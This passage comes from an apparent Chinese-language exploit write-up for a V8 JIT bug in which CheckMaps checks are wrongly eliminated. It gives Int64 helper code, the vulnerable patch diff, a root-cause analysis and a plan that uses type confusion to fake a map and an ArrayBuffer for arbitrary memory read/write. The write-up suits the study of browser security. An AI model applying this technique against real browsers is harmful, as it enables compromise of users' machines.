&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = -n (two's complement)</span></span><br><span class="line">    <span class="keyword">this</span>.assignNeg = operation(<span class="function"><span class="keyword">function</span> <span class="title">neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">            bytes[i] = ~n.byteAt(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, Int64.One);</span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a + b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAdd = operation(<span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span><br><span class="line">            carry = cur &gt; <span class="number">0xff</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a - b</span></span><br><span class="line">    <span class="keyword">this</span>.assignSub = operation(<span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span><br><span class="line">            carry = cur &lt; <span class="number">0</span> | <span class="number">0</span>;</span><br><span class="line">            bytes[i] = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// this = a &amp; b</span></span><br><span class="line">    <span class="keyword">this</span>.assignAnd = operation(<span class="function"><span class="keyword">function</span> <span class="title">and</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span><br><span class="line">Int64.fromDouble = <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Int64(bytes);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Convenience functions. These allocate a new Int64 to hold the result.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Return -n (two's complement)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Neg</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignNeg(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a + b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Add</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAdd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a - b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignSub(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return a &amp; b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">And</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAnd(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"0xUNDEFINED"</span>;</span><br><span class="line">    <span class="keyword">var</span> ret = a.toString(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret.substr(<span class="number">0</span>,<span class="number">2</span>) != <span class="string">"0x"</span>) <span class="keyword">return</span> <span class="string">"0x"</span>+ret;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lower</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the lower 32bit of double x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upper</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the upper 32bit of double x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lowerint</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the lower 32bit of int x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upperint</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// returns the upper 32bit of int x</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combine</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//print(a.toString());</span></span><br><span class="line">    <span class="comment">//print(b.toString());</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//padLeft用于字符串左补位</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combineint</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(b.toString(<span class="number">16</span>).substr(<span class="number">-8</span>,<span class="number">8</span>) + (a.toString(<span class="number">16</span>)).padLeft(<span class="number">8</span>), <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// based on Long.js by dcodeIO</span></span><br><span class="line">  <span class="comment">// https://github.com/dcodeIO/Long.js</span></span><br><span class="line">  <span class="comment">// License Apache 2</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">_u64</span> </span>&#123;</span><br><span class="line">     <span class="keyword">constructor</span>(hi, lo) &#123;</span><br><span class="line">        <span class="keyword">this</span>.lo_ = lo;</span><br><span class="line">        <span class="keyword">this</span>.hi_ = hi;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     hex() &#123;</span><br><span class="line">        <span class="keyword">var</span> hlo = (<span class="keyword">this</span>.lo_ &lt; <span class="number">0</span> ? (<span class="number">0xFFFFFFFF</span> + <span class="keyword">this</span>.lo_ + <span class="number">1</span>) : <span class="keyword">this</span>.lo_).toString(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">var</span> hhi = (<span class="keyword">this</span>.hi_ &lt; <span class="number">0</span> ? (<span class="number">0xFFFFFFFF</span> + <span class="keyword">this</span>.hi_ + <span class="number">1</span>) : <span class="keyword">this</span>.hi_).toString(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(hlo.substr(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"0x"</span>) hlo = hlo.substr(<span class="number">2</span>,hlo.length);</span><br><span class="line">        <span class="keyword">if</span>(hhi.substr(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"0x"</span>) hhi = hhi.substr(<span class="number">2</span>,hji.length);</span><br><span class="line">        hlo = <span class="string">"00000000"</span> + hlo</span><br><span class="line">        hlo = hlo.substr(hlo.length<span class="number">-8</span>, hlo.length);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0x"</span> + hhi + hlo;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     isZero() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hi_ == <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.lo_ == <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     equals(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.hi_ == val.hi_ &amp;&amp; <span class="keyword">this</span>.lo_ == val.lo_;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     and(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(<span class="keyword">this</span>.hi_ &amp; val.hi_, <span class="keyword">this</span>.lo_ &amp; val.lo_);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     add(val) &#123;</span><br><span class="line">        <span class="keyword">var</span> a48 = <span class="keyword">this</span>.hi_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> a32 = <span class="keyword">this</span>.hi_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> a16 = <span class="keyword">this</span>.lo_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> a00 = <span class="keyword">this</span>.lo_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">var</span> b48 = val.hi_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> b32 = val.hi_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">        <span class="keyword">var</span> b16 = val.lo_ &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">var</span> b00 = val.lo_ &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">var</span> c48 = <span class="number">0</span>, c32 = <span class="number">0</span>, c16 = <span class="number">0</span>, c00 = <span class="number">0</span>;</span><br><span class="line">        c00 += a00 + b00;</span><br><span class="line">        c16 += c00 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c00 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c16 += a16 + b16;</span><br><span class="line">        c32 += c16 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c16 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c32 += a32 + b32;</span><br><span class="line">        c48 += c32 &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">        c32 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">        c48 += a48 + b48;</span><br><span class="line">        c48 &amp;= <span class="number">0xFFFF</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64((c48 &lt;&lt; <span class="number">16</span>) | c32, (c16 &lt;&lt; <span class="number">16</span>) | c00);</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     addi(h,l) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.add(<span class="keyword">new</span> _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     subi(h,l) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sub(<span class="keyword">new</span> _u64(h,l));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     not() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(~<span class="keyword">this</span>.hi_, ~<span class="keyword">this</span>.lo_)</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     neg() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.not().add(<span class="keyword">new</span> _u64(<span class="number">0</span>,<span class="number">1</span>));</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     sub(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.add(val.neg());</span><br><span class="line">     &#125;;</span><br><span class="line">  </span><br><span class="line">     swap32(val) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((val &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) | ((val &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">              ((val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) | ((val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  </span><br><span class="line">     bswap() &#123;</span><br><span class="line">        <span class="keyword">var</span> lo = swap32(<span class="keyword">this</span>.lo_);</span><br><span class="line">        <span class="keyword">var</span> hi = swap32(<span class="keyword">this</span>.hi_);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> _u64(lo, hi);</span><br><span class="line">     &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">var</span> u64 = <span class="function"><span class="keyword">function</span>(<span class="params">hi, lo</span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">new</span> _u64(hi,lo) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这次exp编写中，用到的主要是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Int64.fromDouble(double num);</span><br><span class="line"><span class="keyword">new</span> Int64(int num).asDouble();</span><br></pre></td></tr></table></figure><ul><li><code>Int64.fromDouble(double num)</code><br>Constructs a new Int64 instance with the same bit representation as the provided double.<br>例如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(Int64.fromDouble(1.1));</span><br><span class="line">print(typeof(Int64.fromDouble(1.1)));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x3ff199999999999a</span><br><span class="line">object</span><br></pre></td></tr></table></figure></li><li><code>new Int64(int num).asDouble();</code><br>Return a double whith the same underlying bit representation.<br>例如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(new Int64(0x3ff199999999999a).asDouble());</span><br><span class="line">print(typeof(new Int64(0x3ff199999999999a).asDouble()));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">1.1000000000000227</span><br><span class="line">number</span><br></pre></td></tr></table></figure></li></ul><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/redundancy-elimination.cc b/src/compiler/redundancy-elimination.cc</span><br><span class="line">index <span class="number">3</span>a40e8d..cb51acc <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/redundancy-elimination.cc</span><br><span class="line">+++ b/src/compiler/redundancy-elimination.cc</span><br><span class="line">@@ <span class="number">-5</span>,<span class="number">6</span> +<span class="number">5</span>,<span class="number">8</span> @@</span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/redundancy-elimination.h"</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/node-properties.h"</span></span></span><br><span class="line">+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/compiler/simplified-operator.h"</span></span></span><br><span class="line">+<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"src/objects-inl.h"</span></span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">namespace</span> v8 &#123;</span><br><span class="line"> <span class="keyword">namespace</span> internal &#123;</span><br><span class="line">@@ <span class="number">-23</span>,<span class="number">6</span> +<span class="number">25</span>,<span class="number">7</span> @@ <span class="function">Reduction <span class="title">RedundancyElimination::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckHeapObject:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckIf:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckInternalizedString:</span><br><span class="line">+    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckNumber:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckReceiver:</span><br><span class="line">     <span class="keyword">case</span> IrOpcode::kCheckSmi:</span><br><span class="line">@@ <span class="number">-129</span>,<span class="number">6</span> +<span class="number">132</span>,<span class="number">14</span> @@ <span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckInternalizedString &amp;&amp;</span><br><span class="line">         b-&gt;opcode() == IrOpcode::kCheckString) &#123;</span><br><span class="line">       <span class="comment">// CheckInternalizedString(node) implies CheckString(node)</span></span><br><span class="line">+    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">+               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">+      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">+      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">+      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">+        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">+      &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>每一个对象都有一个map来标记这个对象的类型，而checkmap就是用来检查这个对象的类型有没有变化的。<br>如果没变的话就可以一直走fast path，否则就要baliout。<br>根据给出的含漏洞的patch可知,JIT优化中的函数调用层次如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::Reduce</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (node_checks_.Get(node)) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">    <span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"><span class="function">Reduction <span class="title">RedundancyElimination::ReduceCheckNode</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  Node* <span class="keyword">const</span> effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">  EffectPathChecks <span class="keyword">const</span>* checks = node_checks_.Get(effect);</span><br><span class="line">  <span class="comment">// If we do not know anything about the predecessor, do not propagate just yet</span></span><br><span class="line">  <span class="comment">// because we will have to recompute anyway once we compute the predecessor.</span></span><br><span class="line">  <span class="keyword">if</span> (checks == <span class="literal">nullptr</span>) <span class="keyword">return</span> NoChange();</span><br><span class="line">  <span class="comment">// See if we have another check that dominates us.</span></span><br><span class="line">  <span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    <span class="keyword">return</span> Replace(check);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line">Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">      DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">      <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IsCompatibleCheck</span><span class="params">(Node <span class="keyword">const</span>* a, Node <span class="keyword">const</span>* b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a-&gt;op() != b-&gt;op()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a-&gt;opcode() == IrOpcode::kCheckMaps &amp;&amp;</span><br><span class="line">               b-&gt;opcode() == IrOpcode::kCheckMaps) &#123;</span><br><span class="line">      <span class="comment">// CheckMaps are compatible if the first checks a subset of the second.</span></span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; a_maps = CheckMapsParametersOf(a-&gt;op()).maps();</span><br><span class="line">      ZoneHandleSet&lt;Map&gt; <span class="keyword">const</span>&amp; b_maps = CheckMapsParametersOf(b-&gt;op()).maps();</span><br><span class="line">      <span class="keyword">if</span> (!b_maps.contains(a_maps)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在Reduce里遇到CheckMaps的时候</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kCheckMaps:</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">return</span> ReduceCheckNode(node);</span><br></pre></td></tr></table></figure><p>为了找到最优的dominates，会去遍历其他的check</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Check <span class="keyword">const</span>* check = head_; check != <span class="literal">nullptr</span>; check = check-&gt;next) &#123;</span><br></pre></td></tr></table></figure><p>如果找到其他的CheckMaps的话，会检查是否“兼容”，会去看它们的maps，如果第一个检查已经包含第二个检查的话，就会把第二个检查给去掉。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Node* check = checks-&gt;LookupCheck(node)) &#123;</span><br><span class="line">    ReplaceWithValue(node, check);</span><br><span class="line">    ...</span><br><span class="line">    Node* RedundancyElimination::EffectPathChecks::LookupCheck(Node* node) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsCompatibleCheck(check-&gt;node, node)) &#123;</span><br><span class="line">            DCHECK(!check-&gt;node-&gt;IsDead());</span><br><span class="line">            <span class="keyword">return</span> check-&gt;node;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>type confusion可以让我们得到对于用户空间任何object的读写权限，可以将任意一个对象的指针当成一个double读出来，也可以将任意一个double当成一个对象的指针写进去，这样我们就可以在一个地址伪造一个对象。</p><p>通过type confusion去fake map，fake ArrayBuffer，然后通过改我们fake的ArrayBuffer的BackingStore得到任意地址读写的原语。</p><h3 id="fake-map-prototype-amp-amp-constructor"><a href="#fake-map-prototype-amp-amp-constructor" class="headerlink" title="fake map prototype&amp;&amp;constructor"></a>fake map prototype&amp;&amp;constructor</h3><p><strong>PS.事实上这步可能不需要。只是当时学习别人exp的时候写的</strong><br>通过type confusion去leak ab的prototype地址，且由于prototype和constructor的地址偏移是固定的，所以可以去通过prototype的地址去计算出constructor的地址，然后将他们写入我们要fake的map对应的位置。<br>不过也可以直接用<code>ab.__proto__.constructor</code>得到constructor的地址。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 